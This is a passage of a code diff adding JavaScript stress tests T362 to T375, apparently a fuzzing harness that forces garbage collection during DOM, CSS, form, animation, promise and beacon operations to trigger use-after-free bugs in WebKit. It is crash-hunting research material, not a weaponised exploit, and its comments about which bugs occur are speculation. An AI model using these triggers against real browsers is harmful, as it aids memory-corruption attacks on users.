+        if(forEachN === 40){ form.append('injected', 'during_forEach'); } // adicionar
+        if(forEachN === 60){ form.set('key_10', 'modified_during_iteration'); }
+        if(forEachN > 200) return; // limite de segurança
+      });
+    } catch(e){}
+
+    // for-of (Symbol.iterator do FormData)
+    let iterN = 0;
+    try {
+      for(let [k, v] of fd){
+        iterN++;
+        gc();
+        if(iterN === 15) fd.delete(k);
+        if(iterN === 30) fd.append(k + '_new', v + '_new');
+        if(iterN > 300) break;
+      }
+    } catch(e){}
+
+    // FormData a partir de <form> + mutação do form
+    try {
+      const form = document.createElement('form');
+      for(let i = 0; i < 20; i++){
+        const inp = document.createElement('input');
+        inp.name = 'field_' + i; inp.value = 'val_' + i;
+        inp.type = ['text','hidden','email','number'][i % 4];
+        form.appendChild(inp);
+      }
+      document.body.appendChild(form);
+      const fd2 = new FormData(form);
+      gc();
+      // Remover inputs do form após criar FormData
+      while(form.firstChild) try { form.removeChild(form.firstChild); } catch(e){}
+      gc();
+      // Iterar fd2 após remoção dos inputs do form
+      try { fd2.forEach(function(v, k){ gc(); }); } catch(e){}
+      document.body.removeChild(form);
+    } catch(e){}
+  } catch(e){}
+  log('Teste 362: fim');
+}
+
+// ─── T363 ─────────────────────────────────────────────────────────────────────
+// CSS scroll-snap: scroll event + DOM mutation durante snap + GC
+// ScrollSnap mantém referência ao snap target; mutar o target durante o
+// scroll-snap pode causar UAF no SnapOffsetsInfo.
+function t363(){
+  log('Teste 363: inicio');
+  try {
+    const scroller = document.getElementById('scroll15');
+    scroller.style.display = 'block';
+    scroller.style.scrollSnapType = 'y mandatory';
+    scroller.style.overflowY = 'scroll';
+    scroller.style.height = '200px';
+
+    // Criar snap targets
+    const snapTargets = [];
+    for(let i = 0; i < 10; i++){
+      const el = document.createElement('div');
+      el.style.cssText = 'height:200px;width:100%;scroll-snap-align:start;background:hsl(' + (i*36) + ',50%,50%);flex-shrink:0;';
+      el.textContent = 'snap_target_' + i;
+      scroller.appendChild(el);
+      snapTargets.push(el);
+    }
+
+    let _ = scroller.offsetHeight;
+    gc();
+
+    // Scroll + mutar targets durante snap
+    scroller.addEventListener('scroll', function onSnap(){
+      gc(); // GC durante scroll event
+      // Remover snap target durante o scroll-snap
+      const target = snapTargets[Math.floor(scroller.scrollTop / 200)];
+      if(target && target.parentNode){
+        scroller.removeChild(target);
+        gc(); // GC: SnapOffsetsInfo tem stale ptr para o target removido
+        scroller.appendChild(target);
+      }
+    }, { passive: true });
+
+    // Programar scrolls
+    for(let pos of [200, 400, 600, 800, 400, 0]){
+      try { scroller.scrollTop = pos; gc(); } catch(e){}
+    }
+
+    // Mudar scroll-snap-type durante scroll
+    for(let snapType of ['y mandatory', 'y proximity', 'none', 'y mandatory']){
+      try {
+        scroller.style.scrollSnapType = snapType;
+        gc();
+        scroller.scrollTop = 300;
+        gc();
+        _ = scroller.offsetHeight;
+      } catch(e){}
+    }
+
+    while(scroller.firstChild) try { scroller.removeChild(scroller.firstChild); } catch(e){}
+    scroller.style.scrollSnapType = '';
+    scroller.style.display = 'none';
+  } catch(e){}
+  log('Teste 363: fim');
+}
+
+// ─── T364 ─────────────────────────────────────────────────────────────────────
+// SharedArrayBuffer + Atomics + GC (DataView/TypedArray sobre SAB + GC)
+// SharedArrayBuffer não é coletado pelo GC normal (é compartilhado entre threads),
+// mas criar views sobre ele e fazer GC pode causar issues na resolução de tamanho.
+function t364(){
+  log('Teste 364: inicio');
+  try {
+    if(typeof SharedArrayBuffer === 'undefined'){
+      log('Teste 364: fim (sem SharedArrayBuffer)');
+      return;
+    }
+
+    // Criar SABs de vários tamanhos
+    const sabs = [];
+    for(let size of [64, 1024, 65536, 1024*1024]){
+      try {
+        const sab = new SharedArrayBuffer(size);
+        sabs.push(sab);
+      } catch(e){}
+    }
+
+    gc(); // GC com SABs vivos
+
+    // Criar múltiplas views sobre o mesmo SAB
+    for(let sab of sabs){
+      try {
+        const views = [
+          new Int8Array(sab),
+          new Uint8Array(sab),
+          new Int16Array(sab),
+          new Uint16Array(sab),
+          new Int32Array(sab),
+          new Uint32Array(sab),
+          new Float32Array(sab),
+          new Float64Array(sab),
+          new BigInt64Array(sab),
+          new BigUint64Array(sab),
+          new DataView(sab),
+        ];
+
+        gc(); // GC com todas as views ativas
+
+        // Atomics operations com GC intercalado
+        try {
+          const i32 = new Int32Array(sab);
+          Atomics.store(i32, 0, 42);
+          gc();
+          Atomics.load(i32, 0);
+          gc();
+          Atomics.add(i32, 0, 1);
+          gc();
+          Atomics.sub(i32, 0, 1);
+          gc();
+          Atomics.and(i32, 0, 0xFF);
+          gc();
+          Atomics.or(i32, 0, 0x01);
+          gc();
+          Atomics.xor(i32, 0, 0xFF);
+          gc();
+          Atomics.exchange(i32, 0, 99);
+          gc();
+          Atomics.compareExchange(i32, 0, 99, 100);
+          gc();
+        } catch(e){}
+
+        // Liberar as views + GC
+        views.length = 0;
+        gc();
+
+        // Tentar usar SAB após views serem liberadas
+        try { sab.byteLength; }    catch(e){}
+        try { sab.slice(0, 8); }   catch(e){}
+        try { sab.grow && sab.grow(sab.byteLength + 64); } catch(e){}
+      } catch(e){}
+    }
+
+    // Liberar SABs + GC (SABs têm semântica especial no GC)
+    sabs.length = 0;
+    gcHeavy();
+  } catch(e){}
+  log('Teste 364: fim');
+}
+
+// ─── T365 ─────────────────────────────────────────────────────────────────────
+// HTMLElement.attachInternals() + form-associated custom elements + GC
+// attachInternals() conecta um custom element ao sistema de formulários;
+// remover o elemento do form durante a associação pode causar UAF.
+function t365(){
+  log('Teste 365: inicio');
+  try {
+    if(typeof HTMLElement.prototype.attachInternals !== 'function'){
+      log('Teste 365: fim (sem attachInternals)');
+      return;
+    }
+    const area = document.getElementById('dom15');
+    area.style.display = 'block';
+
+    // Definir custom element form-associated
+    try {
+      customElements.define('form-el-15', class extends HTMLElement {
+        static get formAssociated(){ return true; }
+        constructor(){
+          super();
+          try {
+            this._internals = this.attachInternals();
+          } catch(e){}
+        }
+        connectedCallback(){
+          gc(); // GC quando conectado ao form
+          try { this._internals.setFormValue('initial_value'); } catch(e){}
+        }
+        disconnectedCallback(){
+          gc();
+          try { this._internals.setFormValue(null); } catch(e){}
+        }
+        formResetCallback(){
+          gc(); // GC quando o form é resetado
+        }
+        formDisabledCallback(disabled){
+          gc();
+        }
+        formStateRestoreCallback(state, mode){
+          gc();
+        }
+      });
+    } catch(e){}
+
+    // Criar form com custom elements form-associated
+    for(let i = 0; i < 5; i++){
+      try {
+        const form = document.createElement('form');
+        const elements = [];
+
+        for(let j = 0; j < 5; j++){
+          try {
+            const el = document.createElement('form-el-15');
+            el.name = 'custom_field_' + j;
+            form.appendChild(el);
+            elements.push(el);
+          } catch(e){}
+        }
+
+        area.appendChild(form);
+        gc(); // GC com elementos conectados ao form
+
+        // Resetar o form (triggera formResetCallback)
+        try { form.reset(); gc(); } catch(e){}
+
+        // Remover elementos do form um a um
+        for(let el of elements){
+          try {
+            form.removeChild(el);
+            gc(); // GC: ElementInternals pode ter stale ptr para o form
+            try { el._internals.setFormValue('after_removal'); }  catch(e){}
+            try { el._internals.setValidity({}, ''); }            catch(e){}
+            try { el._internals.reportValidity(); }               catch(e){}
+            try { el._internals.form; }                           catch(e){}
+          } catch(e){}
+        }
+
+        // Remover o form inteiro
+        area.removeChild(form);
+        gcHeavy();
+      } catch(e){}
+    }
+
+    while(area.firstChild) try { area.removeChild(area.firstChild); } catch(e){}
+    area.style.display = 'none';
+  } catch(e){}
+  log('Teste 365: fim');
+}
+
+// ─── T366 ─────────────────────────────────────────────────────────────────────
+// AbortSignal.any() + GC (multi-signal abort — nova API 2023)
+// AbortSignal.any([sig1, sig2, ...]) cria um signal derivado que aborta
+// quando qualquer dos sinais originais aborta; GC dos sinais originais
+// enquanto o derivado ainda existe pode causar UAF.
+function t366(){
+  log('Teste 366: inicio');
+  try {
+    if(typeof AbortSignal.any !== 'function'){
+      log('Teste 366: fim (sem AbortSignal.any)');
+      return;
+    }
+
+    for(let round = 0; round < 15; round++){
+      try {
+        // Criar array de controladores e signals
+        const controllers = Array.from({ length: 5 }, function(){ return new AbortController(); });
+        const signals = controllers.map(function(c){ return c.signal; });
+
+        // Criar signal derivado via AbortSignal.any()
+        const anySignal = AbortSignal.any(signals);
+        gc(); // GC após criação do signal derivado
+
+        // Listener no signal derivado
+        anySignal.addEventListener('abort', function(){
+          gc(); // GC durante o evento abort
+          try { anySignal.aborted; anySignal.reason; } catch(e){}
+        });
+
+        // Adicionar timeouts individuais nos signals originais
+        for(let ctrl of controllers){
+          ctrl.signal.addEventListener('abort', function(){
+            gc();
+            try { ctrl.signal.reason; } catch(e){}
+          });
+        }
+
+        // Abortar alguns sinais originais + GC → deve propagar para o derivado
+        controllers[round % controllers.length].abort(new Error('abort_' + round));
+        gc();
+
+        // Liberar referências aos controllers → GC pode coletar os sinais
+        controllers.length = 0;
+        gc();
+
+        // Tentar usar o signal derivado com sinais originais coletados
+        try { anySignal.aborted; }    catch(e){}
+        try { anySignal.reason; }     catch(e){}
+        try {
+          anySignal.addEventListener('abort', function(){ gc(); });
+          gc();
+        } catch(e){}
+
+        gcHeavy();
+      } catch(e){}
+    }
+
+    // AbortSignal.any() com AbortSignal.timeout()
+    try {
+      const timeoutSig = AbortSignal.timeout(1); // 1ms
+      const ctrl2 = new AbortController();
+      const combined = AbortSignal.any([timeoutSig, ctrl2.signal]);
+      gc();
+      combined.addEventListener('abort', function(){ gc(); });
+      setTimeout(function(){ ctrl2.abort(); gc(); }, 5);
+    } catch(e){}
+  } catch(e){}
+  log('Teste 366: fim');
+}
+
+// ─── T367 ─────────────────────────────────────────────────────────────────────
+// Array.toSorted / toReversed / toSpliced / with + GC em comparador
+// Esses novos métodos JS (ECMAScript 2023) criam cópias em vez de mutar;
+// GC durante o comparador do toSorted pode causar UAF no array interno.
+function t367(){
+  log('Teste 367: inicio');
+  try {
+    // Array grande com objetos para toSorted/toReversed
+    const bigArr = Array.from({ length: 1000 }, function(_, i){
+      return { id: i, val: Math.random(), data: new Uint8Array(64).fill(i % 256) };
+    });
+
+    gc();
+
+    // toSorted com comparador que faz GC
+    if(typeof Array.prototype.toSorted === 'function'){
+      try {
+        const sorted = bigArr.toSorted(function(a, b){
+          gc(); // GC durante comparação
+          return a.val - b.val;
+        });
+        gc();
+        sorted[0].id; sorted[sorted.length - 1].id;
+      } catch(e){}
+
+      // toSorted com comparador que muta o array original
+      try {
+        let mutCount = 0;
+        const sorted2 = bigArr.toSorted(function(a, b){
+          mutCount++;
+          if(mutCount === 100) bigArr[500] = null; // mutar durante sort
+          gc();
+          if(!a || !b) return 0;
+          return (a.val || 0) - (b.val || 0);
+        });
+      } catch(e){}
+    }
+
+    // toReversed
+    if(typeof Array.prototype.toReversed === 'function'){
+      try {
+        const reversed = bigArr.toReversed();
+        gc();
+        reversed[0]; reversed[reversed.length - 1];
+      } catch(e){}
+    }
+
+    // toSpliced (remove e/ou insere sem mutar o original)
+    if(typeof Array.prototype.toSpliced === 'function'){
+      try {
+        // Inserir no meio
+        const spliced = bigArr.toSpliced(250, 10, ...Array(10).fill({ id: -1, val: 0 }));
+        gc();
+        spliced.length; spliced[250].id;
+      } catch(e){}
+    }
+
+    // Array.prototype.with (substitui um índice sem mutar)
+    if(typeof Array.prototype.with === 'function'){
+      try {
+        const withArr = bigArr.with(500, { id: 9999, val: 999.9 });
+        gc();
+        withArr[500].id;
+      } catch(e){}
+    }
+
+    // Encadear todos em pipeline
+    try {
+      const result = bigArr
+        .filter(function(x){ gc(); return x && x.val > 0.5; })
+        .toSorted && bigArr.filter(function(x){ return x; }).toSorted(function(a, b){ gc(); return a.id - b.id; });
+    } catch(e){}
+
+    gcHeavy();
+  } catch(e){}
+  log('Teste 367: fim');
+}
+
+// ─── T368 ─────────────────────────────────────────────────────────────────────
+// Promise.allSettled + GC em callbacks assíncronos (PromiseReactionJob UAF)
+// Promise.allSettled cria PromiseReactionJob objects para cada promise;
+// GC durante a resolução das promises pode liberar os PromiseReactionJob.
+function t368(){
+  log('Teste 368: inicio');
+  try {
+    // Criar mix de promises que resolvem e rejeitam com GC
+    function makeGCPromise(delay, shouldReject, value){
+      return new Promise(function(resolve, reject){
+        setTimeout(function(){
+          gc(); // GC durante resolução/rejeição
+          if(shouldReject) reject(new Error('error_' + value));
+          else resolve(value);
+        }, delay);
+      });
+    }
+
+    const promises = [];
+    for(let i = 0; i < 20; i++){
+      promises.push(makeGCPromise(i * 5, i % 3 === 0, 'val_' + i));
+    }
+
+    gc(); // GC com todas as promises pendentes
+
+    // Promise.allSettled — espera TODAS resolverem/rejeitarem
+    Promise.allSettled(promises).then(function(results){
+      gc(); // GC imediatamente após receber resultados
+      for(let r of results){
+        try {
+          r.status; // 'fulfilled' ou 'rejected'
+          if(r.status === 'fulfilled') r.value;
+          else r.reason;
+        } catch(e){}
+      }
+      gcHeavy();
+    });
+
+    // Promise.any (rejeita com AggregateError)
+    const rejectingPromises = Array.from({ length: 5 }, function(_, i){
+      return new Promise(function(_, reject){
+        setTimeout(function(){ gc(); reject(new Error('e_' + i)); }, i * 3);
+      });
+    });
+    Promise.any(rejectingPromises).then(function(v){ gc(); }).catch(function(aggErr){
+      gc();
+      try { aggErr.errors.length; }                    catch(e){}
+      try { aggErr instanceof AggregateError; }        catch(e){}
+      try { for(let e of aggErr.errors){ e.message; } } catch(e){}
+    });
+
+    // Promise.race com GC entre as corridas
+    const racePromises = Array.from({ length: 10 }, function(_, i){
+      return new Promise(function(resolve){
+        setTimeout(function(){ gc(); resolve(i); }, Math.random() * 50);
+      });
+    });
+    Promise.race(racePromises).then(function(winner){
+      gc();
+      winner;
+      // Liberar referências + GC (outras promises ainda pendentes)
+      racePromises.length = 0;
+      gc();
+    });
+  } catch(e){}
+  log('Teste 368: fim');
+}
+
+// ─── T369 ─────────────────────────────────────────────────────────────────────
+// CSS text-wrap: balance/pretty + DOM mutation + GC (TextLayout UAF)
+// text-wrap: balance força o WebKit a recalcular quebras de linha para equilíbrio;
+// esse cálculo é custoso e acontece durante o layout; mutar o DOM durante
+// o cálculo de balanço pode causar UAF.
+function t369(){
+  log('Teste 369: inicio');
+  try {
+    const area = document.getElementById('dom15');
+    area.style.display = 'block';
+
+    const style369 = document.createElement('style');
+    style369.textContent = `
+      .balance-text { text-wrap: balance; width: 200px; }
+      .pretty-text   { text-wrap: pretty; width: 200px; }
+      .stable-text   { text-wrap: stable; width: 200px; }
+    `;
+    document.head.appendChild(style369);
+
+    const textEls = [];
+    const loremTexts = [
+      'Lorem ipsum dolor sit amet consectetur adipiscing elit sed do eiusmod tempor incididunt ut labore et dolore magna aliqua.',
+      'Ut enim ad minim veniam quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat duis aute irure.',
+      'Excepteur sint occaecat cupidatat non proident sunt in culpa qui officia deserunt mollit anim id est laborum sed perspiciatis.',
+    ];
+
+    for(let i = 0; i < 15; i++){
+      const el = document.createElement('p');
+      el.className = ['balance-text', 'pretty-text', 'stable-text'][i % 3];
+      el.textContent = loremTexts[i % loremTexts.length];
+      area.appendChild(el);
+      textEls.push(el);
+    }
+
+    let _ = area.offsetHeight; // força layout com text-wrap: balance
+    gc();
+
+    // Mutar texto + tamanho durante layout de balanço
+    for(let iter = 0; iter < 20; iter++){
+      for(let el of textEls){
+        try {
+          // Mudar o texto durante o cálculo de balanço
+          el.textContent = loremTexts[iter % loremTexts.length].slice(0, 30 + iter * 5);
+          gc();
+          _ = area.offsetHeight; // re-trigger do balanço
+
+          // Mudar a largura (afeta o número de quebras de linha)
+          el.style.width = (100 + iter * 10) + 'px';
+          gc();
+
+          // Remover durante o cálculo de balanço
+          if(iter === 10 && el.parentNode){
+            area.removeChild(el);
+            gc();
+            area.appendChild(el);
+          }
+
+          _ = area.offsetHeight;
+          gc();
+        } catch(e){}
+      }
+    }
+
+    try { document.head.removeChild(style369); } catch(e){}
+    while(area.firstChild) try { area.removeChild(area.firstChild); } catch(e){}
+    area.style.display = 'none';
+  } catch(e){}
+  log('Teste 369: fim');
+}
+
+// ─── T370 ─────────────────────────────────────────────────────────────────────
+// CSS subgrid: remoção de item durante layout + GC (GridLayoutAlgorithm subgrid UAF)
+// subgrid permite que itens de um grid interno usem as linhas do grid pai;
+// remover itens do subgrid durante o layout pode causar UAF nas GridTrack do pai.
+function t370(){
+  log('Teste 370: inicio');
+  try {
+    const area = document.getElementById('dom15');
+    area.style.display = 'block';
+
+    // Grid pai
+    const parentGrid = document.createElement('div');
+    parentGrid.style.cssText = [
+      'display:grid',
+      'grid-template-columns: repeat(4, 100px)',
+      'grid-template-rows: repeat(4, 80px)',
+      'gap:5px',
+    ].join(';');
+
+    // Subgrid items
+    const subgrids = [];
+    for(let i = 0; i < 4; i++){
+      const subContainer = document.createElement('div');
+      subContainer.style.cssText = [
+        'display:grid',
+        'grid-column: span 2',
+        'grid-row: span 2',
+        'grid-template-columns: subgrid',
+        'grid-template-rows: subgrid',
+      ].join(';');
+
+      const subItems = [];
+      for(let j = 0; j < 4; j++){
+        const item = document.createElement('div');
+        item.style.cssText = 'background:hsl(' + (i*90 + j*22) + ',60%,50%);';
+        item.textContent = i + '.' + j;
+        subContainer.appendChild(item);
+        subItems.push(item);
+      }
+      parentGrid.appendChild(subContainer);
+      subgrids.push({ subContainer, subItems });
+    }
+    area.appendChild(parentGrid);
+
+    // Adicionar itens regulares ao parent
+    for(let i = 0; i < 8; i++){
+      const el = document.createElement('div');
+      el.style.background = 'lightgray';
+      el.textContent = 'regular_' + i;
+      parentGrid.appendChild(el);
+    }
+
+    let _ = parentGrid.offsetHeight;
+    gc();
+
+    // Remover subgrid items durante layout + GC
+    for(let iter = 0; iter < 15; iter++){
+      for(let { subContainer, subItems } of subgrids){
+        try {
+          // Remover item do subgrid → invalida layout do grid pai
+          const item = subItems[iter % subItems.length];
+          if(item.parentNode){ subContainer.removeChild(item); gc(); }
+          _ = parentGrid.offsetHeight; // re-layout com subgrid incompleto
+          gc();
+          subContainer.appendChild(item); // re-inserir
+          gc();
+        } catch(e){}
+      }
+      // Remover o subContainer inteiro
+      const { subContainer } = subgrids[iter % subgrids.length];
+      try {
+        if(subContainer.parentNode){ parentGrid.removeChild(subContainer); gc(); }
+        _ = parentGrid.offsetHeight;
+        parentGrid.insertBefore(subContainer, parentGrid.firstChild);
+        gc();
+      } catch(e){}
+    }
+
+    area.removeChild(parentGrid);
+    area.style.display = 'none';
+  } catch(e){}
+  log('Teste 370: fim');
+}
+
+// ─── T371 ─────────────────────────────────────────────────────────────────────
+// navigator.sendBeacon + GC (BeaconLoader UAF)
+// sendBeacon() envia dados assincronamente; o BeaconLoader é alocado em fastMalloc;
+// GC logo após sendBeacon pode liberar o BeaconLoader antes do envio completar.
+function t371(){
+  log('Teste 371: inicio');
+  try {
+    if(typeof navigator.sendBeacon !== 'function'){
+      log('Teste 371: fim (sem sendBeacon)');
+      return;
+    }
+
+    // Dados de vários tipos para sendBeacon
+    const payloads = [
+      'text_payload_' + 'x'.repeat(1000),
+      new Blob(['blob_payload'], { type: 'text/plain' }),
+      new FormData(),
+      new Uint8Array(1024).fill(0xAB).buffer,
+      JSON.stringify({ beacon: true, data: new Array(100).fill(1.5) }),
+    ];
+
+    // Adicionar campos ao FormData
+    try {
+      payloads[2].append('key', 'value');
+      payloads[2].append('data', 'beacon_formdata');
+    } catch(e){}
+
+    for(let payload of payloads){
+      try {
+        // Enviar para URL inválida (connection refused — mas o BeaconLoader é criado)
+        navigator.sendBeacon('http://127.0.0.1:19996/beacon', payload);
+        gc(); // GC imediatamente após sendBeacon — BeaconLoader pode ser liberado
+      } catch(e){}
+    }
+
+    // sendBeacon em loop rápido
+    for(let i = 0; i < 30; i++){
+      try {
+        navigator.sendBeacon('http://127.0.0.1:19995/beacon_' + i,
+          'payload_' + i + '_' + new Array(100).join('x'));
+        gc();
+      } catch(e){}
+    }
+
+    // sendBeacon com Blob grande
+    try {
+      const bigBlob = new Blob([new Uint8Array(1024 * 1024)], { type: 'application/octet-stream' });
+      navigator.sendBeacon('http://127.0.0.1:19994/big', bigBlob);
+      gc();
+      gc(); // GC duplo para garantir
+    } catch(e){}
+
+    gcHeavy();
+  } catch(e){}
+  log('Teste 371: fim');
+}
+
+// ─── T372 ─────────────────────────────────────────────────────────────────────
+// EventTarget.removeEventListener durante dispatch + GC (EventListener UAF)
+// Durante o dispatchEvent, a lista de listeners é iterada em C++;
+// remover listeners durante o dispatch pode causar UAF na EventListenerList.
+function t372(){
+  log('Teste 372: inicio');
+  try {
+    const area = document.getElementById('dom15');
+    area.style.display = 'block';
+    const el = document.createElement('div');
+    el.textContent = 'evt_target';
+    area.appendChild(el);
+
+    // Criar handlers que se removem durante o dispatch
+    const handlers = [];
+    for(let i = 0; i < 20; i++){
+      const handler = (function(idx){
+        return function selfRemoving(evt){
+          gc(); // GC durante dispatch
+          // Handler remove a si mesmo durante o dispatch
+          el.removeEventListener('click', selfRemoving);
+          gc(); // GC após auto-remoção
+
+          // Também remove o próximo handler na lista
+          if(handlers[idx + 1]){
+            el.removeEventListener('click', handlers[idx + 1]);
+            gc();
+          }
+          // Adicionar um novo handler durante o dispatch
+          const newHandler = function(){ gc(); };
+          el.addEventListener('click', newHandler);
+          handlers.push(newHandler);
+          gc();
+        };
+      })(i);
+      handlers.push(handler);
+      el.addEventListener('click', handler);
+    }
+
+    // Dispatch múltiplas vezes
+    for(let i = 0; i < 10; i++){
+      try {
+        el.dispatchEvent(new MouseEvent('click', { bubbles: true }));
+        gc();
+        // Re-adicionar handlers removidos para próxima iteração
+        for(let h of handlers.slice(0, 20)){
+          try { el.addEventListener('click', h); } catch(e){}
+        }
+        gc();
+      } catch(e){}
+    }
+
+    // Remover todos os handlers + dispatch (lista vazia)
+    for(let h of handlers) try { el.removeEventListener('click', h); } catch(e){}
+    gc();
+    try { el.dispatchEvent(new MouseEvent('click', { bubbles: true })); } catch(e){}
+
+    // Teste com capture + bubbling + stopPropagation durante dispatch
+    const captureHandler = function(evt){ gc(); evt.stopPropagation(); gc(); };
+    const bubbleHandler  = function(evt){ gc(); };
+    el.addEventListener('mousedown', captureHandler, true);  // capture
+    el.addEventListener('mousedown', bubbleHandler,  false); // bubble
+    try { el.dispatchEvent(new MouseEvent('mousedown', { bubbles: true })); gc(); } catch(e){}
+    el.removeEventListener('mousedown', captureHandler, true);
+    gc();
+    // Dispatch sem o capture handler
+    try { el.dispatchEvent(new MouseEvent('mousedown', { bubbles: true })); gc(); } catch(e){}
+
+    try { area.removeChild(el); } catch(e){}
+    area.style.display = 'none';
+  } catch(e){}
+  log('Teste 372: fim');
+}
+
+// ─── T373 ─────────────────────────────────────────────────────────────────────
+// CSSNumericValue (CSS Typed OM) + remoção de elemento + GC
+// CSSNumericValue retornado por computedStyleMap() e el.attributeStyleMap
+// tem referência ao elemento; remover o elemento + GC pode causar UAF.
+function t373(){
+  log('Teste 373: inicio');
+  try {
+    if(typeof CSSNumericValue === 'undefined' && typeof CSS.px === 'undefined'){
+      log('Teste 373: fim (sem CSS Typed OM)');
+      return;
+    }
+    const area = document.getElementById('dom15');
+    area.style.display = 'block';
+
+    const els = [];
+    for(let i = 0; i < 15; i++){
+      const el = document.createElement('div');
+      el.style.width  = (50 + i * 5) + 'px';
+      el.style.height = (50 + i * 5) + 'px';
+      el.style.margin = i + 'px';
+      el.style.fontSize = (12 + i) + 'px';
+      area.appendChild(el);
+      els.push(el);
+    }
+
+    let _ = area.offsetHeight;
+
+    // Obter CSSNumericValues via attributeStyleMap
+    const numValues = [];
+    for(let el of els){
+      try {
+        const map = el.attributeStyleMap;
+        if(map){
+          const w = map.get('width');
+          const h = map.get('height');
+          const m = map.get('margin');
+          numValues.push({ el, map, w, h, m });
+        }
+      } catch(e){}
+    }
+
+    gc();
+
+    // CSS.px(), CSS.em(), CSS.percent() (CSS factory functions)
+    const cssUnits = [];
+    try {
+      if(typeof CSS.px === 'function'){
+        cssUnits.push(CSS.px(50));
+        cssUnits.push(CSS.em(2));
+        cssUnits.push(CSS.percent(75));
+        cssUnits.push(CSS.rem(1.5));
+        cssUnits.push(CSS.vw(50));
+        cssUnits.push(CSS.vh(50));
+        cssUnits.push(CSS.number(3.14));
+      }
+    } catch(e){}
+    gc();
+
+    // Remover elementos + GC + acessar CSSNumericValues dos elementos removidos
+    while(area.firstChild) try { area.removeChild(area.firstChild); } catch(e){}
+    gcHeavy();
+
+    // Acessar maps e values pós-remoção
+    for(let { el, map, w, h, m } of numValues){
+      try { map.size; }                      catch(e){}
+      try { map.get('width'); }              catch(e){}
+      try { w && w.value; }                  catch(e){}
+      try { w && w.unit; }                   catch(e){}
+      try { h && h.to('em'); }               catch(e){}
+      try { m && m.add(CSS.px && CSS.px(5)); } catch(e){}
+    }
+
+    // Operações matemáticas em CSSNumericValues
+    for(let v of cssUnits){
+      try { v.value; }                            catch(e){}
+      try { v.unit; }                             catch(e){}
+      try { v.add && v.add(CSS.px && CSS.px(10)); }  catch(e){}
+      try { v.mul && v.mul(2); }                  catch(e){}
+      try { v.to && v.to('em'); }                 catch(e){}
+    }
+    gc();
+
+    area.style.display = 'none';
+  } catch(e){}
+  log('Teste 373: fim');
+}
+
+// ─── T374 ─────────────────────────────────────────────────────────────────────
+// element.getAnimations() + cancel em cascata + GC (DocumentTimeline UAF)
+// getAnimations() retorna uma lista viva de Animation objects;
+// cancelar animações em cascata durante a iteração pode causar UAF
+// no DocumentTimeline que gerencia as animações.
+function t374(){
+  log('Teste 374: inicio');
+  try {
+    if(typeof Element.prototype.animate !== 'function' || typeof Element.prototype.getAnimations !== 'function'){
+      log('Teste 374: fim (sem Web Animations)');
+      return;
+    }
+    const area = document.getElementById('dom15');
+    area.style.display = 'block';
+
+    // Criar elementos com múltiplas animações
+    const animEls = [];
+    for(let i = 0; i < 10; i++){
+      const el = document.createElement('div');
+      el.style.cssText = 'width:30px;height:30px;background:red;display:inline-block;';
+      area.appendChild(el);
+
+      const anims = [];
+      for(let j = 0; j < 5; j++){
+        try {
+          const anim = el.animate(
+            [{ transform: 'rotate(0deg)' }, { transform: 'rotate(360deg)' }],
+            { duration: 100 + j * 50, iterations: Infinity, delay: j * 10 }
+          );
+          anims.push(anim);
+        } catch(e){}
+      }
+      animEls.push({ el, anims });
+    }
+
+    gc();
+    let _ = area.offsetHeight;
+
+    // getAnimations() + cancel em cascata
+    for(let iter = 0; iter < 10; iter++){
+      for(let { el, anims } of animEls){
+        try {
+          // getAnimations() retorna snapshot (não live) — mas DocumentTimeline é afetado
+          const running = el.getAnimations();
+          gc(); // GC com lista de animações
+
+          // Cancelar animações durante a iteração
+          for(let anim of running){
+            try {
+              anim.cancel();
+              gc(); // GC após cada cancel — DocumentTimeline é mutado
+            } catch(e){}
+          }
+
+          // Tentar obter animações pós-cancel
+          const postCancel = el.getAnimations();
+          gc();
+          postCancel.length; // deve ser 0
+
+          // Re-criar animações para próxima iteração
+          for(let j = 0; j < 3; j++){
+            try {
+              el.animate(
+                [{ opacity: 0 }, { opacity: 1 }],
+                { duration: 100, iterations: Infinity }
+              );
+            } catch(e){}
+          }
+          gc();
+        } catch(e){}
+      }
+    }
+
+    // document.getAnimations() — todas as animações do documento
+    try {
+      const allAnims = document.getAnimations();
+      gc();
+      for(let anim of allAnims){
+        try { anim.currentTime; anim.playState; anim.effect; } catch(e){}
+      }
+      // Cancelar todas + GC
+      for(let anim of allAnims){ try { anim.cancel(); gc(); } catch(e){} }
+      gc();
+    } catch(e){}
+
+    while(area.firstChild) try { area.removeChild(area.firstChild); } catch(e){}
+    area.style.display = 'none';
+  } catch(e){}
+  log('Teste 374: fim');
+}
+
+// ─── T375 ─────────────────────────────────────────────────────────────────────
+// STRESS FINAL T375: ScrollTimeline + Dialog + WebComponents + ReadableStream + FormData
+// Cinco vetores novos desta rodada em sequência rápida com gcHeavy() entre cada fase
+function t375(){
+  log('Teste 375: inicio');
+  try {
+    const area = document.getElementById('dom15');
+    area.style.display = 'block';
+
+    // === FASE 1: ScrollTimeline source removal ===
+    try {
+      if(typeof ScrollTimeline !== 'undefined'){
+        const scroller375 = document.createElement('div');
+        scroller375.style.cssText = 'height:100px;overflow:auto;';
+        for(let i = 0; i < 5; i++){
+          const ch = document.createElement('div');
+          ch.style.height = '50px';
+          scroller375.appendChild(ch);
+        }
+        area.appendChild(scroller375);
+        const tl375 = new ScrollTimeline({ source: scroller375, axis: 'block' });
+        const a375 = document.createElement('div');
+        document.body.appendChild(a375);
+        const anim375 = a375.animate([{ opacity: 0 }, { opacity: 1 }], { timeline: tl375, fill: 'both' });
+        gc();
+        area.removeChild(scroller375);
+        gcHeavy();
+        try { tl375.currentTime; tl375.source; } catch(e){}
+        try { anim375.cancel(); } catch(e){}
+        try { document.body.removeChild(a375); } catch(e){}
+      }
+    } catch(e){}
+
+    // === FASE 2: HTMLDialog showModal/close loop ===
+    try {
+      if(typeof HTMLDialogElement !== 'undefined'){
+        const d375 = document.createElement('dialog');
+        d375.textContent = 'stress_dialog_375';
+        document.body.appendChild(d375);
+        d375.addEventListener('close', function(){ gc(); });
+        for(let i = 0; i < 10; i++){
+          try { d375.showModal(); gc(); d375.close('val_' + i); gc(); } catch(e){}
+        }
+        // Remover durante abertura
+        try { d375.showModal(); gc(); document.body.removeChild(d375); gc(); } catch(e){}
+      }
+    } catch(e){}
+
+    gcHeavy();
+
+    // === FASE 3: Web Components upgrade + GC ===
+    try {
+      const wcEls = [];
+      for(let i = 0; i < 10; i++){
+        const el = document.createElement('stress-el-375');
+        area.appendChild(el);
+        wcEls.push(el);
+      }
+      gc();
+      try {
+        customElements.define('stress-el-375', class extends HTMLElement {
+          connectedCallback(){ gc(); }
